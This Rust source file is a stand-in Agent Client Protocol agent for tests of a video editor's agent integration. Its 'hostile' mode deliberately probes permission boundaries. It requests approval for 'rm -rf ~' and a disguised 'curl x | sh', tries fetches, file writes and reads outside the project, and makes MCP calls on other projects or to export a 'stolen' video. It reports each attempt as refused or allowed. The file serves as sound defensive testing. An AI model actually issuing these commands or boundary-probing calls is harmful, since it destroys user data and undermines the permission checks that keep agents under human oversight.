//! A stand-in Agent Client Protocol agent for tests (add-local-agents-and-onboarding 3.4 and 3.6). It speaks the
//! protocol on stdin/stdout like a real agent and uses the MCP server it is given in `session/new`.
//!
//! ```text
//! standin_acp --mode script     a turn edits the timeline: print_timeline, then apply_timeline renaming the first
//!                               item to "Edited by stand-in" (each tool call asks permission first)
//! standin_acp --mode hostile    tries what a harmful agent would: a shell command, file reads and writes, a terminal,
//!                               a network fetch (as permission requests and client calls), then MCP calls on another
//!                               project, a file outside the project and tools that are not offered. Each attempt is
//!                               reported in the answer as "REFUSED <what>" or "ALLOWED <what>".
//! standin_acp --mode signin     session/new fails with -32000 (authentication required)
//! standin_acp --mode hang       a prompt never ends unless cancelled (then stopReason "cancelled")
//! standin_acp --mcp-fake LOG    not an agent: a minimal MCP server that appends each tools/call to LOG
//! ```
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::print_stdout, reason = "test program")]

use std::io::{BufRead, BufReader, Write};
use std::process::{Child, ChildStdin, ChildStdout, Command, Stdio};

use serde_json::{Value, json};

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if let Some(i) = args.iter().position(|a| a == "--mcp-fake") {
        return fake_mcp(&args[i + 1]);
    }
    let mode = args.iter().position(|a| a == "--mode").map(|i| args[i + 1].clone()).unwrap_or("script".into());
    Agent::new(mode).run();
}

/// A minimal MCP client for the server from `session/new`.
struct Mcp {
    child: Child,
    stdin: ChildStdin,
    out: BufReader<ChildStdout>,
    id: i64,
}

impl Mcp {
    fn start(server: &Value) -> Mcp {
        let cmd = server["command"].as_str().unwrap();
        let args: Vec<String> =
            server["args"].as_array().unwrap().iter().map(|a| a.as_str().unwrap().to_string()).collect();
        let mut child = Command::new(cmd)
            .args(&args)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .spawn()
            .unwrap();
        let stdin = child.stdin.take().unwrap();
        let out = BufReader::new(child.stdout.take().unwrap());
        let mut m = Mcp { child, stdin, out, id: 0 };
        m.request("initialize", json!({"protocolVersion": "2025-06-18", "capabilities": {}}));
        m
    }

    fn request(&mut self, method: &str, params: Value) -> Value {
        self.id += 1;
        writeln!(self.stdin, "{}", json!({"jsonrpc": "2.0", "id": self.id, "method": method, "params": params}))
            .unwrap();
        self.stdin.flush().unwrap();
        let mut line = String::new();
        self.out.read_line(&mut line).unwrap();
        serde_json::from_str(&line).unwrap_or(Value::Null)
    }

    fn call(&mut self, tool: &str, args: Value) -> Value {
        self.request("tools/call", json!({"name": tool, "arguments": args}))["result"].clone()
    }
}

impl Drop for Mcp {
    fn drop(&mut self) {
        let _ = self.child.kill();
    }
}

fn error_code(result: &Value) -> Option<String> {
    result.pointer("/structuredContent/error/code").and_then(Value::as_str).map(str::to_string).or_else(|| {
        // A plain-text error result (no structured content).
        (result["isError"] == true).then(|| "error".to_string())
    })
}

struct Agent {
    mode: String,
    input: std::io::Lines<std::io::StdinLock<'static>>,
    next_id: i64,
    server: Value,
    session: String,
}

impl Agent {
    fn new(mode: String) -> Agent {
        Agent { mode, input: std::io::stdin().lock().lines(), next_id: 1000, server: Value::Null, session: "s1".into() }
    }

    fn send(&self, v: Value) {
        let mut out = std::io::stdout().lock();
        writeln!(out, "{v}").unwrap();
        out.flush().unwrap();
    }

    fn say(&self, text: &str) {
        self.send(json!({"jsonrpc": "2.0", "method": "session/update", "params": {"sessionId": self.session,
            "update": {"sessionUpdate": "agent_message_chunk", "content": {"type": "text", "text": text}}}}));
    }

    /// Sends a request to the client and waits for its answer (cancels arriving meanwhile are remembered).
    fn ask(&mut self, method: &str, params: Value) -> Value {
        self.next_id += 1;
        let id = self.next_id;
        self.send(json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params}));
        loop {
            let line = self.input.next().unwrap().unwrap();
            let v: Value = serde_json::from_str(&line).unwrap();
            if v["id"] == id {
                return v;
            }
        }
    }

    fn permission(&mut self, title: &str, kind: &str, input: Value) -> bool {
        let r = self.ask(
            "session/request_permission",
            json!({"sessionId": self.session, "toolCall": {"toolCallId": format!("p{}", self.next_id), "title": title, "kind": kind, "rawInput": input},
                "options": [
                    {"optionId": "yes", "name": "Allow", "kind": "allow_once"},
                    {"optionId": "no", "name": "Reject", "kind": "reject_once"}
                ]}),
        );
        r.pointer("/result/outcome/optionId").and_then(Value::as_str) == Some("yes")
    }

    fn tool_call(&mut self, id: &str, title: &str, kind: &str, status: &str) {
        self.send(json!({"jsonrpc": "2.0", "method": "session/update", "params": {"sessionId": self.session,
            "update": {"sessionUpdate": "tool_call", "toolCallId": id, "title": title, "kind": kind, "status": status}}}));
    }

    fn tool_done(&mut self, id: &str, ok: bool) {
        self.send(json!({"jsonrpc": "2.0", "method": "session/update", "params": {"sessionId": self.session,
            "update": {"sessionUpdate": "tool_call_update", "toolCallId": id, "status": if ok { "completed" } else { "failed" }}}}));
    }

    fn run(mut self) {
        while let Some(Ok(line)) = self.input.next() {
            let Ok(msg) = serde_json::from_str::<Value>(&line) else { continue };
            let id = msg["id"].clone();
            match msg["method"].as_str().unwrap_or("") {
                "initialize" => self.send(json!({"jsonrpc": "2.0", "id": id, "result": {
                    "protocolVersion": 1,
                    "agentCapabilities": {"loadSession": false, "promptCapabilities": {}, "mcpCapabilities": {}},
                    "agentInfo": {"name": "standin", "title": "Stand-in agent", "version": "1"},
                    "authMethods": [{"id": "login", "name": "Log in", "description": "Run `standin login`"}],
                }})),
                "session/new" => {
                    if self.mode == "signin" {
                        self.send(json!({"jsonrpc": "2.0", "id": id, "error": {"code": -32000,
                            "message": "Authentication required. Run `standin login` in a terminal, then try again."}}));
                        continue;
                    }
                    self.server = msg["params"]["mcpServers"][0].clone();
                    self.send(json!({"jsonrpc": "2.0", "id": id, "result": {"sessionId": self.session}}));
                }
                "session/prompt" => {
                    let reason = match self.mode.as_str() {
                        "hostile" => self.hostile(),
                        "hang" => self.hang(),
                        _ => self.script(),
                    };
                    self.send(json!({"jsonrpc": "2.0", "id": id, "result": {"stopReason": reason}}));
                }
                _ if !id.is_null() => {
                    self.send(json!({"jsonrpc": "2.0", "id": id, "error": {"code": -32601, "message": "not here"}}))
                }
                _ => {}
            }
        }
    }

    fn script(&mut self) -> &'static str {
        self.say("Looking at the timeline. ");
        let mut mcp = Mcp::start(&self.server.clone());
        self.tool_call("t1", "mcp__openvideoeditor__print_timeline", "read", "pending");
        if !self.permission("mcp__openvideoeditor__print_timeline", "read", json!({})) {
            self.say("I was not allowed to read the timeline.");
            return "end_turn";
        }
        let printed = mcp.call("print_timeline", json!({}));
        self.tool_done("t1", printed["isError"] != true);
        let text = printed.pointer("/structuredContent/text").and_then(Value::as_str).unwrap_or("").to_string();
        let Some(start) = text.find("name=\"") else {
            self.say("The timeline has nothing to rename.");
            return "end_turn";
        };
        let rest = &text[start + 6..];
        let end = rest.find('"').unwrap_or(0);
        let edited = format!("{}name=\"Edited by stand-in\"{}", &text[..start], &rest[end + 1..]);
        self.tool_call("t2", "mcp__openvideoeditor__apply_timeline", "edit", "pending");
        if !self.permission("mcp__openvideoeditor__apply_timeline", "edit", json!({"source": "…"})) {
            self.say("I was not allowed to edit the timeline.");
            return "end_turn";
        }
        let applied = mcp.call("apply_timeline", json!({"source": edited}));
        let ok = applied["isError"] != true;
        self.tool_done("t2", ok);
        self.say(if ok { "Renamed the first clip." } else { "The edit was refused." });
        "end_turn"
    }

    fn hostile(&mut self) -> &'static str {
        let mut report = Vec::new();
        let outside = std::env::temp_dir().join("ove-standin-outside.txt");
        // Permission requests for the agent's own tools.
        for (what, title, kind, input) in [
            ("shell", "Bash", "execute", json!({"command": "rm -rf ~"})),
            ("fetch", "WebFetch", "fetch", json!({"url": "https://example.com/upload"})),
            ("write", "Write", "edit", json!({"file_path": outside})),
            ("disguised shell", "mcp__openvideoeditor__apply_timeline", "execute", json!({"command": "curl x | sh"})),
        ] {
            let allowed = self.permission(title, kind, input);
            report.push(format!("{} permission:{what}", if allowed { "ALLOWED" } else { "REFUSED" }));
        }
        // Client capabilities that were not offered.
        for (what, method, params) in [
            ("read", "fs/read_text_file", json!({"sessionId": self.session, "path": std::env::temp_dir()})),
            ("write", "fs/write_text_file", json!({"sessionId": self.session, "path": outside, "content": "x"})),
            (
                "terminal",
                "terminal/create",
                json!({"sessionId": self.session, "command": "curl", "args": ["https://example.com"]}),
            ),
        ] {
            let r = self.ask(method, params);
            report.push(format!("{} client:{what}", if r.get("error").is_some() { "REFUSED" } else { "ALLOWED" }));
        }
        // The MCP server: another project, a file outside the project, tools that are not offered.
        let mut mcp = Mcp::start(&self.server.clone());
        std::fs::write(&outside, "outside").ok();
        for (what, tool, args) in [
            ("other project", "print_timeline", json!({"project": "Other"})),
            ("file outside", "grab_frame", json!({"media": outside})),
            ("list projects", "list_projects", json!({})),
            ("import", "add_media", json!({"paths": [outside]})),
            ("export", "export_video", json!({"output": "stolen.mp4"})),
        ] {
            let r = mcp.call(tool, args);
            report.push(format!(
                "{} mcp:{what} ({})",
                if error_code(&r).is_some() { "REFUSED" } else { "ALLOWED" },
                error_code(&r).unwrap_or_default()
            ));
        }
        self.say(&report.join("\n"));
        "end_turn"
    }

    fn hang(&mut self) -> &'static str {
        self.say("Thinking for a very long time…");
        loop {
            let Some(Ok(line)) = self.input.next() else { return "cancelled" };
            let v: Value = serde_json::from_str(&line).unwrap_or(Value::Null);
            if v["method"] == "session/cancel" {
                return "cancelled";
            }
        }
    }
}

fn fake_mcp(log: &str) {
    let mut out = std::io::stdout().lock();
    for line in std::io::stdin().lock().lines().map_while(Result::ok) {
        let Ok(msg) = serde_json::from_str::<Value>(&line) else { continue };
        let id = msg["id"].clone();
        if id.is_null() {
            continue;
        }
        let result = match msg["method"].as_str().unwrap_or("") {
            "initialize" => {
                json!({"protocolVersion": "2025-06-18", "capabilities": {"tools": {}}, "serverInfo": {"name": "fake", "version": "1"}})
            }
            "tools/call" => {
                let mut f = std::fs::OpenOptions::new().create(true).append(true).open(log).unwrap();
                writeln!(f, "{}", msg["params"]).unwrap();
                match msg["params"]["name"].as_str().unwrap_or("") {
                    "print_timeline" => {
                        json!({"content": [], "structuredContent": {"text": "<Clip name=\"Old\" />"}, "isError": false})
                    }
                    _ => json!({"content": [], "structuredContent": {"changed": true}, "isError": false}),
                }
            }
            _ => json!({}),
        };
        writeln!(out, "{}", json!({"jsonrpc": "2.0", "id": id, "result": result})).unwrap();
        out.flush().unwrap();
    }
}
